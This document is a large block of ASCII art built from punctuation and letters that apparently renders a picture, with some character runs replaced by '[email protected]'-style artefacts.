::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.......:...^[email protected]@&@@@@BP&@@GPPPPPPPPPPPPPPPPG#@@@@@&GP55555555555555555PPGGB#&&&@&&#BGP55J?7!!~^^^^:::::::::::::::^^^~!!7?Y5PGG##&@@&&&#BBGPP55555P5555G#@@@@@#GPPPPPPPPPPPPPPPP#@@BP&@@@@&[email protected]@@@&?777?5#@@@@@#Y~.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.........~5&@&[email protected]@@@&[email protected]@#PPPPPPPPPPPPPPPPPPG#@@@@@&BP555555555PPGG##&&&#BGP5J?77!!!!77??JJYY555PPPPPPPPPPP5555YYJJ??7!!~^^^::^~!7JYPGB&&@&&#BGPP5PB&@@@@@#GPPPPPPPPPPPPPPPPPP&@&[email protected]@@@@&[email protected]@@@P7777777JP&@@@@&P~.....:::::::.:::::::::::::::::::::....::::::::::::::.::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....::.........:7G&@&BP555#@@@@BP&@@BPPPPPPPPPPPPPPPPGBPGB&@@@@@&BGPPPGB#&@@@&&BGPPPPGGB##&&@@@@@@&&&&&&&##############&&&&&@@@@@@@@&&##BGPYJ?7!!!7?5PB&@@&&&@@@@@#GPGPPPPPPPPPPPPPPPPP#@@#P&@@@@@#[email protected]@@@#[email protected]@@@@P!............:::::::::::::::::::.......:::...........:::::::::...........:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....::....:..:[email protected]@#GP55PP5P&@@@@[email protected]@@[email protected]&#GPG#@@@@@@@&@@@@@@@@@&&&&&&###BBBBGGGGGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPGGGGGGBBBB###&&&&&&&&#BBGG#@@@@@@@&BPPB&&[email protected]@&[email protected]@@@@&[email protected]@@@&[email protected]@@@@G!...:......:::::::::::::::::::.......:::..:............................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:::.::....:[email protected]@#[email protected]@@@&[email protected]@@GG&BPPPPPPPPPPP#@@@@&##@@@@@@@@&&###BBGGGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPGGGGBB###&&&@@@@@###@@@@GPPPPPPPPPPPB#[email protected]@@[email protected]@@@@@[email protected]@@@@[email protected]@@@@5^..:.....:::::::::::::::::::........:..:.:.^Y5J?:....................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::::....:[email protected]@#[email protected]@@@&[email protected]@@#[email protected]&[email protected]@@@@@@&&##BBGGGPPPPPPPPPPPPPPPPPPPP555YYJ??77!!~~~^^^^^^:::^^^^^~~!!77?JJYY555PPPPPPPPPPPPPPPPPPPPPGGGBB##&&@@@@&BBGGPPPPPG&&G#@@@[email protected]@@@@@#[email protected]@@@@[email protected]@@@&J:.....::::::::::::::::::::...:[email protected]@@5....................::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:[email protected]@#[email protected]@@@@BG&@@&&@@&&##&&@@@&&#BBGGPPPPPPPPPPPPPPPP55YJJ?7!~~^::..                                      ...:::^~!!7?JY5PPPPPPPPPPPPPPPPPPGGB##&&@@&&##&@&B&@@&[email protected]@@@@@&[email protected]@@@&Y777?PPPPPPPPPPP5J77777Y#@@@@B!.....::::::::::::::::::::::.75YYYYYYYY5&@@&5YYYYYYYYYYYYYYYYYY57..::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#G555555555555555555G&@@@@#G#@@@@@@@&&#BBGGPPPPPPPPPPPPPPPPG5J!~::..                             !^7:                                ..:^~!?JPPPPPPPPPPPPPPPPPPGBB#&&@@@@@@&G#@@@@@@&P5P55G&@@@@#J777?PPPPPPPPPPPPPP5J77777P&@@@@Y:....::::::::::::::::::.::.Y&&&&&&&&@@@@&#&&&&&&&&&&&&&&&&&&&&Y..::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@#GP5P5P5555555555555555P#@@@@@@@@@&#BGPPPPPPPPPPPPPPPPPPPPPG#?  ..        .^~!7?JY55GB5. J5YJJ7   7G^Y~ !55YYYJJJJ?7.  7?7!~!?^.            .. .YBPPPPPPPPPPPPPPPPPPPPPGBB#&@@@@@@@@@#P555P#@@@@@[email protected]@@@@J..::::::::::::::::::::.:..::::::::J&@@P^.:::::::::::::::::::::.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.:J&@&[email protected]@@@@#BGPPPPPPPPPPPPPPPPPPPPPPPPP#J ^G##P^      [email protected]^^^G&: [email protected]@7  [email protected]@7   [email protected]^[email protected] :777?J#@PYYYJ7      7B##Y..GBPPPPPPPPPPPPPPPPPPPPPPPPPG#&@@@@&B55PPB&@@@@[email protected]@@@@P..::::::::::::::::::::...:......:5&@@&P555555555555555555Y^....:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:::.::[email protected]@[email protected]@@#GPPPGGPPPPPPPPPPPPPPPPPPPPPPG#^ !#&&#~      .?JJB&&Y7!^[email protected]  :#&~   P#P&^  [email protected]~  5&7  [email protected] ~G&GJJG#YJ5GP~      J&@&B: J#[email protected]@@&GGB#&@@@@#[email protected]@@@@#~...::::::::::::::::::......::[email protected]@@@&################@@@&~...::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:..:..^[email protected]@&G55P5P5555555555555555555555P#@@&PPPGBBBGGPPPPPPPPPPPPPPPPPPPPP#!  :~~.       .??5#7.~!7?GB~  [email protected]!   :&5.&B: [email protected]:.P#~   [email protected]?.5#&PJJ??JJ???^       :~~.  [email protected]@@@@@@@@@#577777JPPPPPPPPPPPPPPPPPPPGGBBGB&@@@@@#~..:.:::::::::::::::::::.:.....~5&@@@@@[email protected]@#~....:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:...7#@&BP5P55555555555555555555555555P&@@#PPPBBGBBBB##GPPPPPPPPPPPPPPPPP&?              ~Y?:J? JG~~#? [email protected]!   [email protected]! [email protected]:.^!5&[email protected]????JJ5&J             .GBPPPPPPPPPPPPPPPPPB##[email protected]@@@@@@@BY77777J5PPPPPPPPPPPPPPPPPPGGBBBGB&@@@@@B~.....::::::::::::::::::.::...~Y&@@BY&@@#PPPPPPPPPPPPPPPP#@@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:[email protected]@#G5P5555555555555555555555555555P#@@&PPP&&#B#&#BGPPPPPPPPPPPPPPPPPP#Y               GP G&^^5P^[email protected] ~B#GPPBY      :^^^:5BG5?^.  [email protected][email protected]             :#GPPPPPPPPPPPPPPPPPGG#&&#B#@#[email protected]@@@@&GJ77777J5PPPPPPPPPPPPPPPPPPGGBBBGB#@@@@@@#^.......::::::::::::::::::.:.!P&@@B?:~&@@BY555555555555555#@@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:..:[email protected]&BP5PPP5P55555555555555555555555P55#@@&GPG&@@&#GPPPPPPPPPPPPPPPPPPPPPGG.             ^#5 !GP5YJ!.!7.  :^^:.            ::       !JJJYYYYYYB#^             ~&GPPPPPPPPPPPPPPPPPPPPPB#@@@[email protected]@@@G?7777?Y5PPPPPPPPPPPPPPPPPPGGBBBBB#&@@@@@&@@G~..::.:::::::::::::::::::...7B&P7:..!&@@5                [email protected]@#~....:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....?&@&G5555555555555555555555555555555PPB&@@@GPG&&BPPPPPPPPPPPPPPPPPPPPPPPPG&:  .~~^       .^.                                              ..:^^.       :~~^.  7&PPPPPPPPPPPPPPPPPPPPPPPPGB&#[email protected]@@G7777JYPPPPPPPPPPPPPPPPPGGGBBBBBBB&@@@@@@#PG&@&?..::.::::::::::::::::::....::[email protected]@@#GGGGGGGGGGGGGGGG&@@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:.:[email protected]@#P5555555555555555555555555555555PB&@#@@@&##GPPPPPPPPPPPPPPPPPPPPPPPPPPP&! [email protected]#&Y                    ..:^^^^^~!!!!!!!~~^^^^^^^:::..                 :###@5  Y#PPPPPPPPPPPPPPPPPPPPPPPPPPPBB#@@@&?7?Y5PPPPPPPPPPPPPPPGGGGBBBBBGBB&@@@@@@&BP55P#@@Y:............:::::::::.::......:[email protected]@@[email protected]@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.........^[email protected]@BP555555555555555555555555555555PG&@#G#@@&#GPPGGPPPPPPPPPPPPPPPPPPPPPPPPP#Y  ?BBP~     ..:^~!7?JJJJYY55PGGGGGGGGGGGGGGGGGGGGGGGGGGPPP55YYJ7!~^:..     ?GBG!  PBPPPPPPPPPPPPPPPPPPPPPPPPGGPPPB#@@&GPPPPPPPPPPPPPPGGGGGBBBBBBBGB#&@@@@@@&BP5PPP5P#@@P^............::::::::::::.::::[email protected]@@5 ...........    [email protected]@#~...::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:.:.::[email protected]&B5555P55555555555555555555555555G#@@P5&@&BGPPGGBBGGPPPPPPPPPPPPPPPPPPPPPPPBP    .:^!?YY5PPPGG&&B&BGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBGGGGGGG#&[email protected]?7~^:.   ~#PPPPPPPPPPPPPPGGPPPPPPPGGBBGGPPPG#@@&BGGGGGGGGGGGBBBBBBBBBBGBB#&@@@@@@&BP55555PP5PB&@B~....::....::::::::::::::::::[email protected]@@5.....:...:[email protected]@&~...::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:.....!#@&G55P555555555555555555555555555PB&@[email protected]@#PPPGGBBBBBBBGGGGBBBBBGPPPPPPPPPPPG##G555PGG#@&GGGGBBB##B#BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB###BBBGGGG#@&GGP5Y5B#[email protected]@&BBBBBBBBBBBBBBBBBBGBB#&@@@@@@@#BP555555555555G&@#!.::.:....:::::::::::::::::::[email protected]@@P.........~#@@@@@@@&5:.::.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:..!&@&G5555555555555555555555555555P5G&@&Y: [email protected]@BPPG&#BBGGGGBBB###BGGPPPPPPPPPPPPGB#B&BGBBBB&@@&BBBBBBBBB########&&&&&&&&&&&&&&&&&&&&&&&&&&&#######BBBBBBBB#&@@&BBBBG#&B#GPPPPPPPPPPPPPGGB##BBBBGGGBBB&#PPG&@@BBBBBBBBBBBBBBGBBB#&@@@@@@@&#GP55P555555555555G&@#!...::...::::::::::::::::::..^Y55?..:......:!777777!^..:::.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........7&@&G5P5555555555555555555555P5555PB&@[email protected]@&PPP#@@&&#####BGGPPPPPPPPPPGGGGBBBBBBBBB####&@@@&&&&&&&&&&&&####BBBBBGGGGGGGGGGGGGGGGGBBBBBB####&&&&&&&&&&&@@@@@#####BBBBBBBGGGGPPPPPPPPPPPGGB#####&&@@[email protected]@&BBBBBBBBBGGBBB#&@@@@@@@@&#GP5555555555555P55555G&@&!.::....:::::::::....:.....:............:... .........:.:..::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.......!#@&G55555555555555555555555555555P#@@P^....^[email protected]@#PPP&@@@&#BGPPPPPPPPGGGBBBBBBB#####&&&&&&###@@@@&PYYJ???777JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ7777??JYY5&@@@@@###&&&&&&#####BBBBBGGGGPPPPPPPPPGB#@@@@BPPP#@@#GGGGBBBB##&&@@@@@@@@&&BGP555555555555555555P5PP5G&@#!.:...::::::::::...............7??7:....!??7:............:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:::.!#@&G5555PP5555555555555555555PP55G&@&?:.:.::.^[email protected]@#GPB&#GPPPPPPGGGGBBB####&&&&###BBGGP55YYJJ?J&@@@B~        :777777777777777777777777777777777^        [email protected]@@@@BJJYY55PGGBB###&&&&####BBBGGGPPPPPPPGB#&GPB&@@#B####&&@@@@@@@@@@@@#BPP555555555555555555555P555P5G&@#!.:.:::::::::::.....::::::::::#@@#^::::[email protected]@#~.::::::::...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....~#@&G555555555555555555555555555P5B&@B!.........7&@@&#BGPPPPGGGBB###&&&###[email protected]@@@Y:      .77777777777777777777777777777777?:      [email protected]@@@@@G77777777???JYY55PGGBB##&&&&##BBGGGPPPPPGB#@@@@@@@@@@@@@@@@@&#[email protected]&B55P5P555555555555555555555555P5G&@#~.:..::::::::.::..^B#########&@@&#####&@@@#########!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....^[email protected]&[email protected]@G^.:[email protected]@&#GPPPPGGBB#&&@&#BGGP55YJJ???7777777JYY?77777!~Y&@@@#?     ~77777777777777777777777777777777?~     [email protected]@@@@BJ77777?YYJ7777777???JYY55PPGGB&&@&##BGGPPPPPG#@@@@@@@&&#BP5J7~:..^[email protected]@BP5P5555555555555555555555555555G&@G^...:::::::::.:.::!777777777#@@#[email protected]@#[email protected]@@7..::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:..:[email protected]@B55P55555555555555555555555P55B&@G^[email protected]@#PPPPPGB#&&@@@#[email protected]#BY77777!?G&@@@B!:^!77777777777777777777777777777777777!^:^[email protected]@@@@BY77777YB#[email protected]??JYY5PGB&@@@&&#GPPPPPG&@@@@BJ!^.. .......:[email protected]@[email protected]@5:.::::::::::....... .    . #@@#.   [email protected]@#: .. [email protected]@@7..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#[email protected]@P:.:..::[email protected]@BPPPPB&@@@@@#5J??7777777777777777777J5?7?P##5?77777JP&@@@BJ777777777777777777777777777777777777775&@@@&GY7777?5##P?7?5J777777777777777777??JJ5G&@@@@@#PPPPP#@@@@@@&#PJ!^.......:[email protected]@#P55555555555555555555555555PPP5#@@J..::::::::::.....^????????#@@#[email protected]@#[email protected]@@7...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..!&@&[email protected]@P:.:.:.:::::[email protected]@&PPPG&@@##BY7777777777777777777777777777777YB&P?77777?5#@@@[email protected]@@#P?7777?P&BY7777777777777777777777777777777JPBB&@@[email protected]@&B#&@@@@@@&G5?~:[email protected]@#P5P555555555555555555555555PGB&@@&?..:::::::::...:[email protected]@@#BBBB&@@&BBBBB&@@&BBBBBBBBB!..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]&[email protected]@G:.:.::::::::[email protected]@#GPPB##@&Y7777777777777777777777777777777???5#&[email protected]@@[email protected]@&GY77777JG&[email protected]&#BGPPG&@&Y77?YPB&@@@@@@@#G5?!^[email protected]@B55555555555555555555PPGB#&&@@@@@@@!.::::::::...:[email protected]@@~....#@@#:...:[email protected]@#^..........:.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#5555P55555555555555555555555G&@B^....:::::::::.:[email protected]@&BGPPP#G7777777777777777777777777777?5G#&&@&&@@@BY777777?P#@&P?777777777777777777777777777Y#&[email protected]@&#&&&&#BPJ7777777777777777777777777777Y&GPPGG#@@@P7777777?J5G#&@@@@@@@&#@@@BGPPPP55555PPPPGGBB#&@@@@@@@@@@@@@G...:..........:[email protected]@B^.::.#@@#:.:.:[email protected]@#~..:::::.:.:..::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......:...~&@&P5555555555555555555555555P5P&@&!.::.:::::::::...:[email protected]@@@&&&@Y777777777777777777777777777P&@@@@@@@@@@@@@#5?777777JPBGJ7777777777777777777777777Y5Y?77777?P#@@@@@@@@@@@@@@G?77777777777777777777777777?&@&&@@@@&BGG5J?77777777?J5G#&@@@@@@@@@@&&&&&&&&&&&@@@@@@@@@@&[email protected]@@@&!.:.......:...~&@@&####B&@@@#####&@@&#######BB#7..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......::[email protected]&G5P5555555555555555555555555P#@@?.:::.:::::::::.:[email protected]@&[email protected]@@@@@@@@@@@@@@&B#BY?777777??7777777777777777777777777777777?YB#B#@@@@@@@@@@@@@@@#?77777777777777777777777777#@@@&#BBBBBBBGP5YJ?777777777?JYPGB#&@@@@@@@@@@@@@@@@&&#[email protected]@@@@P.:......:.:..7###Y7777Y&@@[email protected]@#[email protected]@@?.::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.:...:.:[email protected]@#[email protected]@5.......::::::::...:.... [email protected]@[email protected]@@@@@@@@[email protected]@@BJ5B#B5J?7777777777777777777777777777777?J5B#[email protected]@@BJ775&@@@@@@@@[email protected]@#BGGBBBBBBBGPPPP5YJ?777777777777?JJY555PPPPP55YYJ??77777777777J&@@@@@!..:....::...::::....:[email protected]@&! [email protected]@#^.... [email protected]@@7...::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....:..:[email protected]@G5P55P55555555555555555555P5P&@#^.......:::::::::[email protected]@@@@@@@@&!     7&@@P!7?5G#P7777777777777777777777777777777P#[email protected]@@J     ^#@@@@@@@@57777777777777777777777777?#@&@&BBBBBBBBBGPPPPPPP5YJ??77777777777777777777777777777??J77777J&@@@@@P::[email protected]@&?...:.:[email protected]@#^....^[email protected]@&~.:.::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@&P5555555555555555555555555P5#@@J.:....::::::::::........:#@[email protected]@@@@@@@P       [email protected]@&?7777??7777777777777777777777777777777??77777#@@B.      [email protected]@@@@@@@#[email protected]@@@@&[email protected]@@@@@@!.:.............:!P&@@G!.:....:[email protected]@#!PGGB&@@&J....::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]@G5PP55555555555555555P5555P5G&@B:.:.....::::::::::::::.:[email protected]&[email protected]@@@@@@@B.      [email protected]@@[email protected]@@B.      [email protected]@@@@@@@@J7777777777777777777777777?&@@@@@@#[email protected]@@@@@@5........:.:^~?P#@@#5!:...:...:[email protected]@#~5GGGG5J~..:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.......~#@&P55555555555555555555555555P#@@7..::....:::::::::::::::[email protected]#[email protected]@@@@@@@@P:   :[email protected]@@@J7777777777777777777777777777777777777777777?&@@@P^   ^[email protected]@@@@@@@@@[email protected]@@@@@@&[email protected]@@@@&@#^.......:.^[email protected]&#GY7^.....::...:[email protected]@#^.........:..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::...:[email protected]@#5P555P555555555555555555555G&@B:...:...::::::::::::::::[email protected]#[email protected]@@@&&&@@@&BGB&@@@@#[email protected]@@@&BGB&@@@@&&@@@@@[email protected]@#Y&@@@@#GBBBBBBGPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP?7777#@@@@[email protected]@?.......:..^!^:........::....:~!!~:..........:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@[email protected]@J.....:....:::::::::.::.:.^#@[email protected]@@&BBB&@@@@@@@@@@@[email protected]@@@@@@@@@@@#[email protected]@@@@##[email protected]@&[email protected]@@@#[email protected]@@@&[email protected]@P:....::.::...........:.:.:^::.......:.::......:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......:&@&P55555555555555555555P55555P&@&!..:......::::::::..:[email protected]?77!~^..         ..~YPG#&@@@@@@@@#B#&@@@@@@@@@@B?777777??77!~^::...         ...::^[email protected]@@@@@@@@@@&BB#@@@#GGGGBBB##P~         ..:^[email protected]@#!^[email protected]@@@&BGBBBBBBBGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP?777?&@@@@B5P&@#^......:...:7?~...::.:..^G&#G! .............:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P55555555555555555555555555G&@B:.:.::::::::::::::......7&@P?7~:              :[email protected]@@@@@@@@@@@@@@@G?7777?77!^:.                         ..^~!7??77775&@@@@@@@@@@@@@@@@BJ77!^:.:~JPY~            .^[email protected]@&?:[email protected]@@@&[email protected]@@@#P5P&@@!......:[email protected]@&[email protected]@@&555555555555J^...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::[email protected]@[email protected]@Y..:.:::::::::::::::....7&@5!^.              .?5?^.    .:?P&@@@@@@@@@@@@@#GJ77??7!^:.            ..:^~~~^:..           .^!77?77?P#&@@@@@@&#BB&@@@@B!   ... .~Y~              ^[email protected]@&?.J&@@@@#[email protected]@@@&[email protected]@J...:.:.:..~5&@@&Y^..:Y&@@&####&&&###@@@@#^.:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@B5555555555555555555555P5PP5#@@7.::::::::::::::::::...^#@#^            .:~!7?J?7???77~!5&@@&B5YYY55555YJ?777!~:.           .~?5GB#&@@@@@&&#G5?~.         .:~!777??YY55YJ?77!!7Y&@@@P77?????77??!^.            ~&@@&! [email protected]@@@&[email protected]@@@&P5P55G&@5.:...::.....~P&@&[email protected]@@@&Y:.::::.:Y&@@B~..:.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]&G5555555555555555555555P5PPP&@@!.:::::::::::::::::[email protected]@J           :[email protected]@@&G~  .::^~~~~~~^^:.            .!5#@@@@@@@@@@@@@@@@@@@&P7.          .::^~~~~~~^^:.   .?P#@@@5?????J??JJJ?!:           [email protected]@@G:.:Y&@@@@&[email protected]@@@&P55P55G&@G........:!!:[email protected]@&5J#@@G7:..:[email protected]@@5^.:.:::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......^[email protected]&P55555555555555555555555555P&@@^.:::::::::::::::::::.!&@#^          [email protected]@&PJ?!                           [email protected]@@@@@@@@@@@@@@@@@@@@@@@@#?                         ~???JP&@@P???????????JJ!.         ~&@@@[email protected]@@@@#BGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGJ77J#@@@@&P5555P5G&@B:....:[email protected]@B?:. [email protected]#5~..^Y#@@[email protected]@&G!.......:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::...:..^#@&P55555555555555555555555555P&@#^.::::::::::::::::::[email protected]@5~:        ^J?????????????J#@@BJ???J~                         ^&@@@@@@@@@@@@@@@@@@@@@@@@@@@@7                       [email protected]@G????????????J!        :[email protected]@@[email protected]@@@@&BBGBBBBBBBBBBBBBBBBBBBBBBBBBGJ7?P&@@@@#P5555555P&@#^...:..:[email protected]@@B?:.:^^..... [email protected]@@@@@B7.........:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::...:..~#@&P55555555555555555555555555P&@B:.::::::::::::::::::[email protected]@J~~^.      ^J????????????J#@&5?????J!                         [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@&^                       [email protected]@5???????????J!       :~^[email protected]@@G:......!P&@@@@&#BBGGBBBBBBBBBBBBBBBBBBBBP?7Y#@@@@&G55P555555P&@#^...:.:..:[email protected]@&?.....::~?5B&@@#B&@@#PJ7~:.......::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::..:...~&@&P55555555555555555555555555P&@#^.::::::::::::::::::[email protected]@J~~~~.      [email protected]&Y????JJ7.                          [email protected]@@@@@@@@@@@@@@@@@@@@@@@@&7                         [email protected]&J????????JJ!.     .^~~^[email protected]@@G:.:::....~Y#@@@@@&##[email protected]@@@@BP5P5P555555P&@#~..:.......:??:..!?YPB#&&&B5?~:.^?5B&@@&#BP5?..::.::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....^#@&P55555555555555555555555555P&@&^.:::::::::::::::::[email protected]@Y~~~~~:      :[email protected]&Y?JJJ?7^                             ^5&@@@@@@@@@@@@@@@@@@@@@@P~                           :[email protected]??JJJJJ?!:      :~~~~^[email protected]@@5..:........:75#@@@@@@&&##BBBBBBBBBBBBGY5#@@@@@#P555P55555555P&@#^..::.....:..~5Y7Y###@@@#BPP5PPPPPPPB#@@@#&G~.::..::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....^#@&P555555555555555555555555P5P&@@~.::::::::::::::::::[email protected]@P~~~~~~~:      .:^[email protected]!~:.                                .!5#@@@@@@@@@@@@@@@@@#5!:.                             .:~!77??##???7!~:.      .^[email protected]@@7.::.::::::....:!YG&@@@@@@@@@&&&&&&&&&&@@@@@@#G55P55555555555P&@#^.:::....::.~#@@#^::[email protected]@@#B#########BB&@@&!::.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....^[email protected]&P55555555555555555555555555P#@@7.:.:::::::::::::::::.!&@#!~~~~~~~^:          ..:G?.                                       ..^7YPB&@@@@@@@&#GY7^:.                                     . ^5:.          .^~~~~~~~!&@@G:.:..:::::::::.....^!J5G#&@@@@@@@@@@@@@@@&#BP55PP555555555555G&@B:..::.:....!#@@&[email protected]@@?..........:[email protected]@&!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]&[email protected]@J.::.::::::::::::::::[email protected]@5^~~~~~~~~~:.         .Y^                                           ..:^~!7#@&J!~^::..                                         :P.        .:^~~~~~~~~^[email protected]@@!.:.:::::::::::.::.......:^[email protected]@&BBBBBGGGPP5555555555555555555G&@G...:.:.:..7#@@&[email protected]@@[email protected]@&!....::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@B555555555555555555555555555G&@G..:.::...::::::::::...^#@&7^~~~~~~~~~~^:.      .5^                         ^^                   .::^[email protected]&!::.                   :^                        :P:     .:^~~~~~~~~~~~7&@@Y..::::::::::::::::::[email protected]@[email protected]@5........:J&@@#[email protected]@@?::::::::::::[email protected]@&!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::...:[email protected]@B555555555555555555555555555P&@&~...:.....:::::::::....!&@#!~~~~~~~~~~~~~^:..  .5^                         .JY~                 .^[email protected]@@BJ^.                 ^JY.                        :5.  .:^[email protected]@P:.:::::::::::::::::::......:.^#@&[email protected]@J.:..::.^[email protected]@@B~...::[email protected]@@&&&&&&&&&&&&&&@@@!..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::..::[email protected]@#P5555555555555555555555555P5#@@?.:...::..::::::::[email protected]@B!~~~~~~~~~~~~~~~~^:^5~                           !GGJ!:.         .^75#@@@@@@@#57^:.         :~?GB?                          !J^^[email protected]@G:..:::::::::::::::::::[email protected]@#P5P55P55555555555555555555555P&@@!.....:.:!YG5^.:[email protected]@&[email protected]@&!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::.:...:#@&P555555555555555555555555PP5G&@G:..:.:...:::::::::......7&@B7^~~~~~~~~~~~~~~~~~??^:..                        .!P##BPYJ?77?J5G&@@@@@#B#&@@@@&B5J?77?JYPB##G?.                      ..::^Y!~~~~~~~~~~~~~~~~^[email protected]@P:.:.::::::::::::::::::......:[email protected]@G5PP55555555555555555555555555P&@#^.....::.......::::..^~~~:............^~^~:.:.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@G555555555555555555555555P55P&@&~.:::.:..:::::::::..:....7&@&J^^~~~~~~~~~~~~~~~~?~~~~~^^::..                    :!J5G#&&&&@&&#BPY?!~^^!7YPG#&&@@&&&#GPJ!:                  ...:^^~~~~~~7~~~~~~~~~~~~~~~~:7#@@J:.::.:::::::::::::::::::.......~&@&[email protected]@5....................:......................:..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@#[email protected]@P:.......:::::::::..:...:[email protected]@5^:~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^::...                .:^^~~~~~^^::::::::::::^^~~~~~^:..             ...::^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~^:[email protected]@B!..:...:::::::::::::::::::[email protected]@B5P55P555555555555555555555555P#@@?..............................................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::...:.:.^#@&G555555P555555555555555555P5P#@@7.......::::::::::.:......:[email protected]@#?..^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^:::....             .              .          ....::::^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:[email protected]&Y:.:.:...:::::::::::::::::::.:....!&@#P55555555555555555555555555PP5P&@#^.:.........:::......:..........:..............:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::..:::.:[email protected]@[email protected]@B:.......:::::::::::::::::[email protected]@B7..:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^:::::::::::::::::::::^^^^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^[email protected]@5~...::::::::::::::::::::::::::....:[email protected]@[email protected]@Y..:..:......:...::::.............:.::::........:::::::::::::::::::::
